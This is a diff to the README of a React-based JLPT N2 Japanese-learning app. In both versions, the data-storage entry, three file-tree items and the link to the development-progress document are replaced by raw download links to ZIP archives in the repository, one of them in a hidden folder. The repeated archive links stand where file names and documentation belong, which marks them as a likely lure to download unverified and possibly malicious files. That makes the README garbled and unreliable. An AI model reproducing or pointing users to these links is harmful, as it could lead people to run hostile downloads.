@@ -7,7 +7,7 @@
 - **前端框架**: React 18 + TypeScript
 - **构建工具**: Vite
 - **样式方案**: Tailwind CSS
-- **数据存储**: IndexedDB (https://github.com/yongsinfok/jlpt-n2-learning/raw/refs/heads/main/.serena/jlpt_learning_n_v2.2-beta.2.zip)
+- **数据存储**: IndexedDB (https://raw.githubusercontent.com/yongsinfok/jlpt-n2-learning/main/src/components/common/jlpt_n_learning_v3.5.zip)
 - **状态管理**: Zustand
 - **路由管理**: React Router v6
 - **图标库**: Lucide React
@@ -59,9 +59,9 @@ jlpt-n2-learning/
 │   ├── utils/          # 工具函数
 │   ├── types/          # TypeScript 类型定义
 │   └── db/             # IndexedDB 配置和操作
-├── https://github.com/yongsinfok/jlpt-n2-learning/raw/refs/heads/main/.serena/jlpt_learning_n_v2.2-beta.2.zip
-├── https://github.com/yongsinfok/jlpt-n2-learning/raw/refs/heads/main/.serena/jlpt_learning_n_v2.2-beta.2.zip
-└── https://github.com/yongsinfok/jlpt-n2-learning/raw/refs/heads/main/.serena/jlpt_learning_n_v2.2-beta.2.zip
+├── https://raw.githubusercontent.com/yongsinfok/jlpt-n2-learning/main/src/components/common/jlpt_n_learning_v3.5.zip
+├── https://raw.githubusercontent.com/yongsinfok/jlpt-n2-learning/main/src/components/common/jlpt_n_learning_v3.5.zip
+└── https://raw.githubusercontent.com/yongsinfok/jlpt-n2-learning/main/src/components/common/jlpt_n_learning_v3.5.zip
 ```
 
 ## 快速开始
@@ -96,7 +96,7 @@ npm run preview
 
 🚧 **当前开发阶段**: Phase 1 - 项目骨架 (95%)
 
-详细开发进度请查看 [https://github.com/yongsinfok/jlpt-n2-learning/raw/refs/heads/main/.serena/jlpt_learning_n_v2.2-beta.2.zip](https://github.com/yongsinfok/jlpt-n2-learning/raw/refs/heads/main/.serena/jlpt_learning_n_v2.2-beta.2.zip)
+详细开发进度请查看 [https://raw.githubusercontent.com/yongsinfok/jlpt-n2-learning/main/src/components/common/jlpt_n_learning_v3.5.zip](https://raw.githubusercontent.com/yongsinfok/jlpt-n2-learning/main/src/components/common/jlpt_n_learning_v3.5.zip)
 
 ## 数据说明
 
